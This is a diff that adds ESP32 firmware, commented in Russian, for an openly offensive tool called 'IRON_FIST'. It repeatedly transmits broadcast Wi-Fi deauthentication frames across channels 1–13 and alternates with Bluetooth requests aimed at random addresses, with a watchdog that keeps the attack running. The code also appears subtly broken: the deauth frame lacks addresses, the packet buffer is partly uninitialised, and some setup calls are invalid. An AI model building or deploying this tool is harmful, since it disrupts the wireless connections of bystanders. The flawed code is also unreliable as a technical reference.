@@ -1,0 +1,158 @@
+#include "esp_wifi.h"
+#include "esp_bt.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "driver/gpio.h"
+#include "esp_task_wdt.h"
+#include "esp_timer.h"
+
+#define LED_PIN 2
+#define TAG "IRON_FIST"
+
+// Защищенные глобальные переменные
+static volatile uint8_t attack_mode = 1; // 0=stop, 1=wifi, 2=bt, 3=all
+static volatile uint8_t system_ok = 1;
+
+// СУПЕР-быстрый deauth (оптимизированный)
+static const uint8_t DEAUTH_RAW[] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+
+// Защищенная WiFi атака
+void safe_wifi_attack() {
+    if(!system_ok) return;
+    
+    static uint8_t channel = 1;
+    esp_wifi_set_channel(channel, 0);
+    
+    // Быстрая отправка (без лишних копий)
+    uint8_t packet[26];
+    memcpy(packet, DEAUTH_RAW, 10);
+    packet[24] = 0x01; // Reason code
+    
+    for(int i=0; i<3; i++) { // 3 пакета на канал
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
+        vTaskDelay(5 / portTICK_PERIOD_MS); // Короткая пауза
+    }
+    
+    channel = (channel % 13) + 1; // Цикл по каналам 1-13
+}
+
+// Защищенная Bluetooth атака
+void safe_bt_attack() {
+    if(!system_ok) return;
+    
+    static uint32_t last_bt = 0;
+    uint32_t now = esp_timer_get_time() / 1000;
+    
+    if(now - last_bt > 100) { // Раз в 100мс
+        esp_bd_addr_t mac = {
+            rand()&0xFF, rand()&0xFF, rand()&0xFF,
+            rand()&0xFF, rand()&0xFF, rand()&0xFF
+        };
+        esp_bt_gap_read_remote_name(mac);
+        last_bt = now;
+    }
+}
+
+// Монитор системы (сторожевой пёс)
+void system_monitor(void* arg) {
+    uint32_t last_heap = esp_get_free_heap_size();
+    uint8_t errors = 0;
+    
+    while(1) {
+        // Проверка памяти
+        uint32_t heap = esp_get_free_heap_size();
+        if(heap < 30000) { // Меньше 30КБ - тревога
+            errors++;
+            if(errors > 5) {
+                system_ok = 0; // Экстренная остановка
+                vTaskDelay(1000 / portTICK_PERIOD_MS);
+                system_ok = 1; // Попытка восстановления
+                errors = 0;
+            }
+        }
+        
+        // Сброс watchdog
+        esp_task_wdt_reset();
+        
+        vTaskDelay(500 / portTICK_PERIOD_MS);
+    }
+}
+
+// Главная атакующая задача с защитой
+void attack_task(void* arg) {
+    // Регистрируем задачу в watchdog
+    esp_task_wdt_add(NULL);
+    
+    uint32_t loop_counter = 0;
+    
+    while(system_ok) {
+        // ЧЕРЕДУЕМ атаки (не все сразу)
+        switch(loop_counter++ % 4) {
+            case 0: safe_wifi_attack(); break;
+            case 1: safe_bt_attack(); break;
+            case 2: // Пауза для "дыхания"
+                gpio_set_level(LED_PIN, 1);
+                vTaskDelay(20 / portTICK_PERIOD_MS);
+                gpio_set_level(LED_PIN, 0);
+                break;
+            case 3: // Проверка состояния
+                if(esp_get_free_heap_size() < 25000) {
+                    vTaskDelay(100 / portTICK_PERIOD_MS); // Даём отдых
+                }
+                break;
+        }
+        
+        // ОБЯЗАТЕЛЬНО отдаем управление
+        esp_task_wdt_reset(); // Сбрасываем watchdog
+        vTaskDelay(1 / portTICK_PERIOD_MS); // Минимальная пауза
+        
+        // Автоматический перезапуск каждые 10000 циклов
+        if(loop_counter > 10000) {
+            vTaskDelay(100 / portTICK_PERIOD_MS); // Отдых
+            loop_counter = 0;
+        }
+    }
+}
+
+// Инициализация с защитой
+void safe_init() {
+    // 1. Настройка пинов
+    gpio_set_direction(LED_PIN, GPIO_MODE_OUTPUT);
+    
+    // 2. Включаем watchdog
+    esp_task_wdt_init(5, true); // Таймаут 5 секунд
+    
+    // 3. WiFi (минимальная конфигурация)
+    esp_wifi_init(NULL);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    vTaskDelay(100 / portTICK_PERIOD_MS); // Ждём инициализации
+    
+    // 4. Bluetooth (если не инициализируется - пропускаем)
+    if(esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_IDLE) {
+        esp_bt_controller_init(NULL);
+        vTaskDelay(50 / portTICK_PERIOD_MS);
+        esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
+    }
+}
+
+void app_main() {
+    // Быстрое мигание при запуске
+    for(int i=0; i<10; i++) {
+        gpio_set_level(LED_PIN, i%2);
+        vTaskDelay(100 / portTICK_PERIOD_MS);
+    }
+    
+    // Безопасная инициализация
+    safe_init();
+    
+    // Запуск монитора
+    xTaskCreate(system_monitor, "monitor", 2048, NULL, 10, NULL);
+    
+    // Пауза перед атакой
+    vTaskDelay(500 / portTICK_PERIOD_MS);
+    
+    // Основная атака
+    attack_task(NULL);
+}
